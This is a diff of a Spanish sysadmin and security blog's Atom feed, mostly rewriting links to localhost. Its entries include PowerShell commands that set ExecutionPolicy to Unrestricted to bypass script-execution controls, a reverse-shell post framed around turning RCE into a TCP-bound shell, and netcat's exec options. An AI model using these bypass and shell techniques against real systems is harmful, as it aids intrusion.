+  &lt;li&gt;&lt;a href=&quot;https://msdn.microsoft.com/powershell/reference/5.1/Microsoft.PowerShell.Core/about/about_Execution_Policies&quot;&gt;MSDN: About Execution Policies&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&quot;cambiar-executionpolicy-para-este-proceso-en-particular&quot;&gt;Cambiar ExecutionPolicy para este proceso en particular&lt;/h2&gt;
+
+&lt;p&gt;La &lt;code class=&quot;highlighter-rouge&quot;&gt;ExecutionPolicy&lt;/code&gt; puede ser distinta en distintos ámbitos; pues la cambiamos para este proceso de PowerShell:&lt;/p&gt;
+
+&lt;div class=&quot;language-posh highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;PS &lt;/span&gt;C:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\I&lt;/span&gt;EUser&amp;gt; &lt;span class=&quot;nb&quot;&gt;Get-ExecutionPolicy&lt;/span&gt; -list
+&lt;span class=&quot;nb&quot;&gt;Get-ExecutionPolicy&lt;/span&gt; -list
+
+        Scope ExecutionPolicy
+        ----- ---------------
+MachinePolicy       Undefined
+   UserPolicy       Undefined
+      &lt;span class=&quot;k&quot;&gt;Process       &lt;/span&gt;Undefined
+  CurrentUser      Restricted
+ LocalMachine      Restricted
+
+
+
+&lt;span class=&quot;nb&quot;&gt;PS &lt;/span&gt;C:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\I&lt;/span&gt;EUser&amp;gt; &lt;span class=&quot;nb&quot;&gt;Set-ExecutionPolicy &lt;/span&gt;Unrestricted -Scope &lt;span class=&quot;k&quot;&gt;Process
+&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;Set-ExecutionPolicy &lt;/span&gt;Unrestricted -Scope &lt;span class=&quot;k&quot;&gt;Process
+
+&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;PS &lt;/span&gt;C:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\I&lt;/span&gt;EUser&amp;gt; ./Get-BasicInfo.ps1
+./Get-BasicInfo.ps1
+
+
+Caption                 : Microsoft Windows 10 Enterprise Evaluation
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;...]
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;h2 id=&quot;lo-mismo-para-un-usuario&quot;&gt;Lo mismo para un usuario&lt;/h2&gt;
+
+&lt;div class=&quot;language-posh highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;PS &lt;/span&gt;C:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\I&lt;/span&gt;EUser&amp;gt; &lt;span class=&quot;nb&quot;&gt;Set-ExecutionPolicy &lt;/span&gt;Unrestricted -Scope CurrentUser
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;Hay muchas otras formas, algunas creativas y originales, pero esto es más que suficiente. Queda suficientemente claro que Microsoft nunca entendió la &lt;code class=&quot;highlighter-rouge&quot;&gt;ExecutionPolicy&lt;/code&gt; como un control de seguridad; de hecho, proporciona los mecanismos para sortearla.&lt;/p&gt;</content><category term="security" /><category term="powershell" /><summary type="html">En una de las charlas a las que acude con frecuencia -bueno, creo que en varias :)-, Pablo González estuvo explicando diferentes posibilidades para ejecutar scripts en PowerShell “saltándose” los controles de ejecución (ExecutionPolicy).</summary></entry><entry><title type="html">Gnome keyring</title><link href="http://localhost:4000/gnome-keyring/" rel="alternate" type="text/html" title="Gnome keyring" /><published>2016-12-12T00:00:00+01:00</published><updated>2016-12-12T00:00:00+01:00</updated><id>http://localhost:4000/gnome-keyring</id><content type="html" xml:base="http://localhost:4000/gnome-keyring/">&lt;p&gt;Entre los cambios de password rutinarios hay uno que me molesta sobremanera porque no podía &lt;em&gt;escriptarlo&lt;/em&gt;: el del &lt;a href=&quot;https://wiki.gnome.org/Projects/GnomeKeyring&quot;&gt;Gnome keyring&lt;/a&gt;&lt;/p&gt;
 
 &lt;p&gt;El caso es que, al no poder realizar el cambio desde la línea de comandos, no tenía más remedio que arrancar la consola gráfica (&lt;a href=&quot;https://wiki.gnome.org/Apps/Seahorse&quot;&gt;Seahorse&lt;/a&gt;) y cambiarlo en ella, que es mucho más incómodo.&lt;/p&gt;
 
@@ -83,7 +386,7 @@ Type &lt;span class=&quot;s2&quot;&gt;&quot;help&quot;&lt;/span&gt;, &lt;span cl
         &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Error changing Gnome Keyring Password&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
         &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;</content><category term="gnome" /><category term="python" /><summary type="html">Algunos usos para el keyring de Gnome</summary></entry><entry><title type="html">Reverse shells</title><link href="/reverse-shell/" rel="alternate" type="text/html" title="Reverse shells" /><published>2016-12-11T00:00:00+01:00</published><updated>2016-12-11T00:00:00+01:00</updated><id>/reverse-shell</id><content type="html" xml:base="/reverse-shell/">&lt;p&gt;Situación: encontrado un método de RCE pero sin posibilidad de acceso a la shell. Solución: &lt;em&gt;bind&lt;/em&gt; de la shell a un puerto TCP.&lt;/p&gt;
+&lt;/div&gt;</content><category term="gnome" /><category term="python" /><summary type="html">Algunos usos para el keyring de Gnome</summary></entry><entry><title type="html">Reverse shells</title><link href="http://localhost:4000/reverse-shell/" rel="alternate" type="text/html" title="Reverse shells" /><published>2016-12-11T00:00:00+01:00</published><updated>2016-12-11T00:00:00+01:00</updated><id>http://localhost:4000/reverse-shell</id><content type="html" xml:base="http://localhost:4000/reverse-shell/">&lt;p&gt;Situación: encontrado un método de RCE pero sin posibilidad de acceso a la shell. Solución: &lt;em&gt;bind&lt;/em&gt; de la shell a un puerto TCP.&lt;/p&gt;
 
 &lt;h2 id=&quot;netcat&quot;&gt;netcat&lt;/h2&gt;
 
@@ -153,9 +456,9 @@ target
 &lt;/code&gt;&lt;/pre&gt;
 &lt;/div&gt;
 
-&lt;p&gt;Si hay alguna razón para ejecutar la shell vía algún lenguaje de scripting (PHP, Perl, Python, Java, Ruby… ¡¡Gawk!!) &lt;a href=&quot;https://highon.coffee/blog/reverse-shell-cheat-sheet/&quot;&gt;aquí&lt;/a&gt; hay un montón de pruebas de concepto para entretenerse un rato.&lt;/p&gt;</content><category term="shell" /><category term="netcat" /><category term="security" /><summary type="html">Reverse shell cheat sheet</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="/%7B%22feature%22=%3E%22pexels-photo-2.jpeg%22%7D" /></entry><entry><title type="html">Have I been pwned?</title><link href="/pwned/" rel="alternate" type="text/html" title="Have I been pwned?" /><published>2016-12-09T00:00:00+01:00</published><updated>2016-12-09T00:00:00+01:00</updated><id>/pwned</id><content type="html" xml:base="/pwned/">&lt;p&gt;&lt;a href=&quot;https://troyhunt.com&quot;&gt;TroyHunt&lt;/a&gt;, experto en seguridad australiano, MVP de Microsoft en Developer Security, Microsoft Regional Director (y más cosas :P) puso en marcha una web &lt;a href=&quot;https://haveibeenpwned.com&quot;&gt;haveibeenpwned.com&lt;/a&gt; donde consultar si una cuenta online había sido comprometida (&lt;em&gt;pwned&lt;/em&gt;) en ciertos incidentes de seguridad, incluidos los famosos &lt;em&gt;hackeos&lt;/em&gt; de &lt;a href=&quot;http://www.theverge.com/2013/11/7/5078560/over-150-million-breached-records-from-adobe-hack-surface-online&quot;&gt;Adobe&lt;/a&gt;, &lt;a href=&quot;http://motherboard.vice.com/read/another-day-another-hack-117-million-linkedin-emails-and-password&quot;&gt;LinkedIn&lt;/a&gt;, etc.&lt;/p&gt;
+&lt;p&gt;Si hay alguna razón para ejecutar la shell vía algún lenguaje de scripting (PHP, Perl, Python, Java, Ruby… ¡¡Gawk!!) &lt;a href=&quot;https://highon.coffee/blog/reverse-shell-cheat-sheet/&quot;&gt;aquí&lt;/a&gt; hay un montón de pruebas de concepto para entretenerse un rato.&lt;/p&gt;</content><category term="shell" /><category term="netcat" /><category term="security" /><summary type="html">Reverse shell cheat sheet</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/%7B%22feature%22=%3E%22pexels-photo-2.jpeg%22%7D" /></entry><entry><title type="html">Have I been pwned?</title><link href="http://localhost:4000/pwned/" rel="alternate" type="text/html" title="Have I been pwned?" /><published>2016-12-09T00:00:00+01:00</published><updated>2016-12-09T00:00:00+01:00</updated><id>http://localhost:4000/pwned</id><content type="html" xml:base="http://localhost:4000/pwned/">&lt;p&gt;&lt;a href=&quot;https://troyhunt.com&quot;&gt;TroyHunt&lt;/a&gt;, experto en seguridad australiano, MVP de Microsoft en Developer Security, Microsoft Regional Director (y más cosas :P) puso en marcha una web &lt;a href=&quot;https://haveibeenpwned.com&quot;&gt;haveibeenpwned.com&lt;/a&gt; donde consultar si una cuenta online había sido comprometida (&lt;em&gt;pwned&lt;/em&gt;) en ciertos incidentes de seguridad, incluidos los famosos &lt;em&gt;hackeos&lt;/em&gt; de &lt;a href=&quot;http://www.theverge.com/2013/11/7/5078560/over-150-million-breached-records-from-adobe-hack-surface-online&quot;&gt;Adobe&lt;/a&gt;, &lt;a href=&quot;http://motherboard.vice.com/read/another-day-another-hack-117-million-linkedin-emails-and-password&quot;&gt;LinkedIn&lt;/a&gt;, etc.&lt;/p&gt;
 
-&lt;p&gt;Puedes encontrar en &lt;a href=&quot;https://github.com/lmarqueta/pwned2&quot;&gt;GitHub&lt;/a&gt; un pequeño script para consultar la base de datos vía API. Ojo con los términos de &lt;a href=&quot;https://haveibeenpwned.com/API/v2#AcceptableUse&quot;&gt;uso aceptable&lt;/a&gt;&lt;/p&gt;</content><category term="security" /><summary type="html">Script to check if an email address (or any email address in a file) has been pwned. Uses haveibeenpwned.com API v2</summary></entry><entry><title type="html">Migración a Jekyll</title><link href="/migracion-a-jekyll/" rel="alternate" type="text/html" title="Migración a Jekyll" /><published>2016-12-06T00:00:00+01:00</published><updated>2016-12-06T00:00:00+01:00</updated><id>/migracion-a-jekyll</id><content type="html" xml:base="/migracion-a-jekyll/">&lt;p&gt;Hace un tiempo migré la vieja web semiabandonada &lt;a href=&quot;http://marqueta.org&quot;&gt;marqueta.org&lt;/a&gt; a Jekyll alojado en &lt;a href=&quot;https://github.com&quot;&gt;GitHub&lt;/a&gt;. Mola, porque es como aquéllas primeras webs escritas en vi(m) con plantillas y expresiones regulares, pero a lo bestia :)&lt;/p&gt;
+&lt;p&gt;Puedes encontrar en &lt;a href=&quot;https://github.com/lmarqueta/pwned2&quot;&gt;GitHub&lt;/a&gt; un pequeño script para consultar la base de datos vía API. Ojo con los términos de &lt;a href=&quot;https://haveibeenpwned.com/API/v2#AcceptableUse&quot;&gt;uso aceptable&lt;/a&gt;&lt;/p&gt;</content><category term="security" /><summary type="html">Script to check if an email address (or any email address in a file) has been pwned. Uses haveibeenpwned.com API v2</summary></entry><entry><title type="html">Migración a Jekyll</title><link href="http://localhost:4000/migracion-a-jekyll/" rel="alternate" type="text/html" title="Migración a Jekyll" /><published>2016-12-06T00:00:00+01:00</published><updated>2016-12-06T00:00:00+01:00</updated><id>http://localhost:4000/migracion-a-jekyll</id><content type="html" xml:base="http://localhost:4000/migracion-a-jekyll/">&lt;p&gt;Hace un tiempo migré la vieja web semiabandonada &lt;a href=&quot;http://marqueta.org&quot;&gt;marqueta.org&lt;/a&gt; a Jekyll alojado en &lt;a href=&quot;https://github.com&quot;&gt;GitHub&lt;/a&gt;. Mola, porque es como aquéllas primeras webs escritas en vi(m) con plantillas y expresiones regulares, pero a lo bestia :)&lt;/p&gt;
 
 &lt;p&gt;Ahora aprovecho para hecer un poco de limpieza y cambiar el tema por uno basado en &lt;a href=&quot;https://mmistakes.github.io/so-simple-theme/&quot;&gt;so-simple-theme&lt;/a&gt;. Poco a poco intentaré ir migrando posts antiguos. O no…&lt;/p&gt;
 
@@ -201,7 +504,7 @@ bundle install
 
 &lt;p&gt;Lorem ipsum dolor sit amet, test link adipiscing elit. &lt;strong&gt;This is strong&lt;/strong&gt;. Nullam dignissim convallis est. Quisque aliquam.&lt;/p&gt;
 
-&lt;p class=&quot;pull-right&quot;&gt;&lt;img src=&quot;/images/sampleimg1.jpg&quot; alt=&quot;Smithsonian Image&quot; /&gt;&lt;/p&gt;
+&lt;p class=&quot;pull-right&quot;&gt;&lt;img src=&quot;http://localhost:4000/images/sampleimg1.jpg&quot; alt=&quot;Smithsonian Image&quot; /&gt;&lt;/p&gt;
 
 &lt;p&gt;&lt;em&gt;This is emphasized&lt;/em&gt;. Donec faucibus. Nunc iaculis suscipit dui. 53 = 125. Water is H&lt;sub&gt;2&lt;/sub&gt;O. Nam sit amet sem. Aliquam libero nisi, imperdiet at, tincidunt nec, gravida vehicula, nisl. The New York Times &lt;cite&gt;(That’s a citation)&lt;/cite&gt;. &lt;u&gt;Underline&lt;/u&gt;. Maecenas ornare tortor. Donec sed tellus eget sapien fringilla nonummy. Mauris a ante. Suspendisse quam sem, consequat at, commodo vitae, feugiat in, nunc. Morbi imperdiet augue quis tellus.&lt;/p&gt;
 
@@ -303,13 +606,13 @@ bundle install
 
 &lt;p&gt;Make any link standout more when applying the &lt;code class=&quot;highlighter-rouge&quot;&gt;.btn&lt;/code&gt; class.&lt;/p&gt;
 
-&lt;div&gt;&lt;a href=&quot;#&quot; class=&quot;btn&quot;&gt;This is a button&lt;/a&gt;&lt;/div&gt;</content><category term="blog" /><category term="jekyll" /><category term="so-simple-theme" /><category term="git" /><summary type="html">Migración a Jekyll</summary></entry><entry><title type="html">El valor de un PC hackeado</title><link href="/el-valor-de-un-pc-hackeado/" rel="alternate" type="text/html" title="El valor de un PC hackeado" /><published>2016-11-19T00:00:00+01:00</published><updated>2016-11-19T00:00:00+01:00</updated><id>/el-valor-de-un-pc-hackeado</id><content type="html" xml:base="/el-valor-de-un-pc-hackeado/">&lt;p&gt;Ocurre en alguna ocasión que, en medio de una conversación fuera del entorno del trabajo, surge el tema de la seguridad. Y es fácil que se subestime la importancia de la misma en el entorno doméstico con frases como “yo no tengo nada que esconder”, “no guardo nada de valor”, “no tengo nada que le pueda importar a nadie”, etc.&lt;/p&gt;
+&lt;div&gt;&lt;a href=&quot;#&quot; class=&quot;btn&quot;&gt;This is a button&lt;/a&gt;&lt;/div&gt;</content><category term="blog" /><category term="jekyll" /><category term="so-simple-theme" /><category term="git" /><summary type="html">Migración a Jekyll</summary></entry><entry><title type="html">El valor de un PC hackeado</title><link href="http://localhost:4000/el-valor-de-un-pc-hackeado/" rel="alternate" type="text/html" title="El valor de un PC hackeado" /><published>2016-11-19T00:00:00+01:00</published><updated>2016-11-19T00:00:00+01:00</updated><id>http://localhost:4000/el-valor-de-un-pc-hackeado</id><content type="html" xml:base="http://localhost:4000/el-valor-de-un-pc-hackeado/">&lt;p&gt;Ocurre en alguna ocasión que, en medio de una conversación fuera del entorno del trabajo, surge el tema de la seguridad. Y es fácil que se subestime la importancia de la misma en el entorno doméstico con frases como “yo no tengo nada que esconder”, “no guardo nada de valor”, “no tengo nada que le pueda importar a nadie”, etc.&lt;/p&gt;
 
 &lt;p&gt;Nada más lejos de la realidad.&lt;/p&gt;
 
 &lt;p&gt;Hace unos días leí un artículo sobre cómo un ciberdelincuente puede monetizar un PC hackeado. Está perfectamente resumido en un sencillo gráfico:&lt;/p&gt;
 
-&lt;p&gt;&lt;img src=&quot;/images/hackedPc.png&quot; alt=&quot;Hacked PC&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;http://localhost:4000/images/hackedPc.png&quot; alt=&quot;Hacked PC&quot; /&gt;&lt;/p&gt;
 
 &lt;p&gt;En el &lt;a href=&quot;https://krebsonsecurity.com/2012/10/the-scrap-value-of-a-hacked-pc-revisited/&quot;&gt;artículo original de Brian Krebs&lt;/a&gt; el pie de foto dice más o menos literalmente: “La próxima vez que alguien pregunte por qué los ciberdelincuentes querrían hackear su PC, muéstrele este diagrama“. Y eso hago :)&lt;/p&gt;
 
@@ -386,7 +689,7 @@ bundle install
   &lt;/li&gt;
 &lt;/ul&gt;
 
-&lt;p&gt;Merece la pena pensar un poco sobre ello.&lt;/p&gt;</content><category term="security" /><summary type="html">Se subestima la importancia de la seguridad en el entorno doméstico</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="/%7B%22feature%22=%3E%22pexels-photo.jpeg%22%7D" /></entry><entry><title type="html">Encoding con la Shell</title><link href="/encoding-con-la-shell/" rel="alternate" type="text/html" title="Encoding con la Shell" /><published>2016-10-04T00:00:00+02:00</published><updated>2016-10-04T00:00:00+02:00</updated><id>/encoding-con-la-shell</id><content type="html" xml:base="/encoding-con-la-shell/">&lt;p&gt;&lt;em&gt;Oneliners&lt;/em&gt; para distintos &lt;em&gt;encodings&lt;/em&gt; con la shell&lt;/p&gt;
+&lt;p&gt;Merece la pena pensar un poco sobre ello.&lt;/p&gt;</content><category term="security" /><summary type="html">Se subestima la importancia de la seguridad en el entorno doméstico</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/%7B%22feature%22=%3E%22pexels-photo.jpeg%22%7D" /></entry><entry><title type="html">Encoding con la Shell</title><link href="http://localhost:4000/encoding-con-la-shell/" rel="alternate" type="text/html" title="Encoding con la Shell" /><published>2016-10-04T00:00:00+02:00</published><updated>2016-10-04T00:00:00+02:00</updated><id>http://localhost:4000/encoding-con-la-shell</id><content type="html" xml:base="http://localhost:4000/encoding-con-la-shell/">&lt;p&gt;&lt;em&gt;Oneliners&lt;/em&gt; para distintos &lt;em&gt;encodings&lt;/em&gt; con la shell&lt;/p&gt;
 
 &lt;ul id=&quot;markdown-toc&quot;&gt;
   &lt;li&gt;&lt;a href=&quot;#rot13&quot; id=&quot;markdown-toc-rot13&quot;&gt;Rot13&lt;/a&gt;&lt;/li&gt;
@@ -457,11 +760,11 @@ lorem ipsum dolor sit amet
 &lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;s3cr3t&quot;&lt;/span&gt; | openssl passwd -1 -stdin -salt foobar     &lt;span class=&quot;c&quot;&gt;# shadow&lt;/span&gt;
 &lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;s3cr3t&quot;&lt;/span&gt; | openssl passwd -apr1 -stdin -salt foobar  &lt;span class=&quot;c&quot;&gt;# apache&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
 
-&lt;p&gt;Y muchos más &lt;a href=&quot;https://gist.github.com/Janfy/940195a6fc4278112458]&quot;&gt;aquí&lt;/a&gt; y &lt;a href=&quot;https://www.redspin.com/it-security-blog/2009/07/string-encoding-in-the-shell/&quot;&gt;aquí&lt;/a&gt;.&lt;/p&gt;</content><category term="encoding" /><category term="bash" /><category term="shell" /><summary type="html">Shell _snippets_ para distintas codificaciones</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="/%7B%22feature%22=%3E%22bluebinary.jpg%22%7D" /></entry><entry><title type="html">Agente adito standalone</title><link href="/agente-adito-standalone/" rel="alternate" type="text/html" title="Agente adito standalone" /><published>2016-09-27T00:00:00+02:00</published><updated>2016-09-27T00:00:00+02:00</updated><id>/agente-adito-standalone</id><content type="html" xml:base="/agente-adito-standalone/">&lt;p&gt;¡Ja!&lt;/p&gt;
+&lt;p&gt;Y muchos más &lt;a href=&quot;https://gist.github.com/Janfy/940195a6fc4278112458]&quot;&gt;aquí&lt;/a&gt; y &lt;a href=&quot;https://www.redspin.com/it-security-blog/2009/07/string-encoding-in-the-shell/&quot;&gt;aquí&lt;/a&gt;.&lt;/p&gt;</content><category term="encoding" /><category term="bash" /><category term="shell" /><summary type="html">Shell _snippets_ para distintas codificaciones</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/%7B%22feature%22=%3E%22bluebinary.jpg%22%7D" /></entry><entry><title type="html">Agente adito standalone</title><link href="http://localhost:4000/agente-adito-standalone/" rel="alternate" type="text/html" title="Agente adito standalone" /><published>2016-09-27T00:00:00+02:00</published><updated>2016-09-27T00:00:00+02:00</updated><id>http://localhost:4000/agente-adito-standalone</id><content type="html" xml:base="http://localhost:4000/agente-adito-standalone/">&lt;p&gt;¡Ja!&lt;/p&gt;
 
 &lt;p&gt;Este era el post estrella en el &lt;del&gt;viejo&lt;/del&gt; mítico &lt;a href=&quot;http://marqueta.org&quot;&gt;marqueta.org&lt;/a&gt;. Pues no. Se acabó. Ya no hay adito. Que estamos en 2016…&lt;/p&gt;
 
-&lt;p&gt;Se siente. A cascarla.&lt;/p&gt;</content><category term="adito" /><category term="vpn" /><summary type="html">¡Vale ya de adito!</summary></entry><entry><title type="html">So-Simple-Theme Setup</title><link href="/install-jekyll-theme-so-simple/" rel="alternate" type="text/html" title="So-Simple-Theme Setup" /><published>2016-09-12T14:42:37+02:00</published><updated>2016-09-12T14:42:37+02:00</updated><id>/install-jekyll-theme-so-simple</id><content type="html" xml:base="/install-jekyll-theme-so-simple/">&lt;p&gt;General notes and suggestions for customizing &lt;strong&gt;So Simple Theme&lt;/strong&gt;.&lt;/p&gt;
+&lt;p&gt;Se siente. A cascarla.&lt;/p&gt;</content><category term="adito" /><category term="vpn" /><summary type="html">¡Vale ya de adito!</summary></entry><entry><title type="html">So-Simple-Theme Setup</title><link href="http://localhost:4000/install-jekyll-theme-so-simple/" rel="alternate" type="text/html" title="So-Simple-Theme Setup" /><published>2016-09-12T14:42:37+02:00</published><updated>2016-09-12T14:42:37+02:00</updated><id>http://localhost:4000/install-jekyll-theme-so-simple</id><content type="html" xml:base="http://localhost:4000/install-jekyll-theme-so-simple/">&lt;p&gt;General notes and suggestions for customizing &lt;strong&gt;So Simple Theme&lt;/strong&gt;.&lt;/p&gt;
 
 &lt;ul id=&quot;markdown-toc&quot;&gt;
   &lt;li&gt;&lt;a href=&quot;#installation&quot; id=&quot;markdown-toc-installation&quot;&gt;Installation&lt;/a&gt;&lt;/li&gt;
@@ -677,7 +980,7 @@ bundle &lt;span class=&quot;nb&quot;&gt;exec &lt;/span&gt;jekyll serve
 
 &lt;h3 id=&quot;link-post-type&quot;&gt;Link Post Type&lt;/h3&gt;
 
-&lt;p&gt;So Simple Theme supports &lt;strong&gt;link posts&lt;/strong&gt;, made famous by John Gruber. To activate just add &lt;code class=&quot;highlighter-rouge&quot;&gt;link: http://url-you-want-linked&lt;/code&gt; to the post’s YAML front matter and you’re done. Here’s an &lt;a href=&quot;/articles/sample-link-post&quot;&gt;example of a link post&lt;/a&gt; if you need a visual.&lt;/p&gt;
+&lt;p&gt;So Simple Theme supports &lt;strong&gt;link posts&lt;/strong&gt;, made famous by John Gruber. To activate just add &lt;code class=&quot;highlighter-rouge&quot;&gt;link: http://url-you-want-linked&lt;/code&gt; to the post’s YAML front matter and you’re done. Here’s an &lt;a href=&quot;http://localhost:4000/articles/sample-link-post&quot;&gt;example of a link post&lt;/a&gt; if you need a visual.&lt;/p&gt;
 
 &lt;h3 id=&quot;author-override&quot;&gt;Author Override&lt;/h3&gt;
 
@@ -754,7 +1057,7 @@ bundle &lt;span class=&quot;nb&quot;&gt;exec &lt;/span&gt;jekyll serve
 
 &lt;p&gt;Here’s an example of a tweet with Twitter Cards enabled.&lt;/p&gt;
 
-&lt;p&gt;&lt;img src=&quot;/images/twitter-card-summary-large-image.jpg&quot; alt=&quot;Twitter Card summary large image screenshot&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;http://localhost:4000/images/twitter-card-summary-large-image.jpg&quot; alt=&quot;Twitter Card summary large image screenshot&quot; /&gt;&lt;/p&gt;
 
 &lt;hr /&gt;
 
@@ -797,157 +1100,11 @@ bundle &lt;span class=&quot;nb&quot;&gt;exec &lt;/span&gt;jekyll serve
       &lt;p&gt;If you’re using GitHub Pages to host your site be aware that plugins are disabled. You’ll need to build your site locally and then manually deploy if you want to use this sweet plugin. &lt;a href=&quot;#fnref:plugins&quot; class=&quot;reversefootnote&quot;&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
     &lt;/li&gt;
   &lt;/ol&gt;
-&lt;/div&gt;</content><author><name>Michael Rose</name></author><category term="jekyll" /><category term="so-simple-theme" /><summary type="html">Instructions on how to install and customize the Jekyll theme So Simple.</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="/%7B%22feature%22=%3E%22so-simple-sample-image-6.jpg%22,%20%22credit%22=%3E%22WeGraphics%22,%20%22creditlink%22=%3E%22http://wegraphics.net/downloads/free-ultimate-blurred-background-pack/%22%7D" /></entry><entry><title type="html">Google Cloud Print y Chrome en “headless mode”</title><link href="/google-cloud-print-y-chrome-en-headless-mode/" rel="alternate" type="text/html" title="Google Cloud Print y Chrome en &quot;headless mode&quot;" /><published>2015-12-03T00:00:00+01:00</published><updated>2015-12-03T00:00:00+01:00</updated><id>/google-cloud-print-y-chrome-en-headless-mode</id><content type="html" xml:base="/google-cloud-print-y-chrome-en-headless-mode/">&lt;p&gt;La verdad es que Google Cloud Print es cómodo para ciertos usos (por ejemplo, imprimir desde un Android). Pero tiene un pequeño inconveniente: requiere que el servidor de impresora tenga Google Chrome arrancado, lo que no necesariamente ocurre.&lt;/p&gt;
+&lt;/div&gt;</content><author><name>Michael Rose</name></author><category term="jekyll" /><category term="so-simple-theme" /><summary type="html">Instructions on how to install and customize the Jekyll theme So Simple.</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/%7B%22feature%22=%3E%22so-simple-sample-image-6.jpg%22,%20%22credit%22=%3E%22WeGraphics%22,%20%22creditlink%22=%3E%22http://wegraphics.net/downloads/free-ultimate-blurred-background-pack/%22%7D" /></entry><entry><title type="html">Google Cloud Print y Chrome en “headless mode”</title><link href="http://localhost:4000/google-cloud-print-y-chrome-en-headless-mode/" rel="alternate" type="text/html" title="Google Cloud Print y Chrome en &quot;headless mode&quot;" /><published>2015-12-03T00:00:00+01:00</published><updated>2015-12-03T00:00:00+01:00</updated><id>http://localhost:4000/google-cloud-print-y-chrome-en-headless-mode</id><content type="html" xml:base="http://localhost:4000/google-cloud-print-y-chrome-en-headless-mode/">&lt;p&gt;La verdad es que Google Cloud Print es cómodo para ciertos usos (por ejemplo, imprimir desde un Android). Pero tiene un pequeño inconveniente: requiere que el servidor de impresora tenga Google Chrome arrancado, lo que no necesariamente ocurre.&lt;/p&gt;
 
 &lt;p&gt;Bueno, pues hay una solución muy fácil mediante Xvfb (virtual framebuffer), un servidor “gráfico” que no muestra nada por pantalla. Así:&lt;/p&gt;
 
 &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;xvfb-run --server-args='-screen 0, 1024x768x24' google-chrome \
 -start-maximized http://debian.org &amp;gt; /dev/null &amp;amp;
 &lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;</content><category term="google" /><category term="chrome" /><category term="print" /><summary type="html">Arrancar Google Chrome en Xvfb</summary></entry><entry><title type="html">Uso de netcat</title><link href="/uso-de-netcat/" rel="alternate" type="text/html" title="Uso de netcat" /><published>2015-08-06T00:00:00+02:00</published><updated>2015-08-06T00:00:00+02:00</updated><id>/uso-de-netcat</id><content type="html" xml:base="/uso-de-netcat/">&lt;h2 id=&quot;netcat&quot;&gt;netcat&lt;/h2&gt;
-
-&lt;p&gt;Netcat es una utilidad que permite el envío y recepción de datos vía TCP/UDP desde la consola. Inicialmente desarrollada para Unix, se ha portado al menos a Windows y OS X. Hay varios &lt;em&gt;forks&lt;/em&gt; con distintas capacidades; en resumen, está en todas partes y sirve para… muchas cositas.&lt;/p&gt;
-
-&lt;h2 id=&quot;sintaxis&quot;&gt;Sintaxis&lt;/h2&gt;
-
-&lt;p&gt;De la versión instalada por defecto en Debian Jessie:&lt;/p&gt;
-
-&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;root@jessie:~# &lt;/span&gt;nc -h
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;v1.10-41]
-connect to somewhere:	nc &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;-options] hostname port[s] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;ports] ...
-listen &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;inbound:	nc -l -p port &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;-options] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;hostname] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;port]
-options:
-	-c shell commands	as &lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;-e&lt;span class=&quot;s1&quot;&gt;'; use /bin/sh to exec [dangerous!!]
-	-e filename		program to exec after connect [dangerous!!]
-	-b			allow broadcasts
-	-g gateway		source-routing hop point[s], up to 8
-	-G num			source-routing pointer: 4, 8, 12, ...
-	-h			this cruft
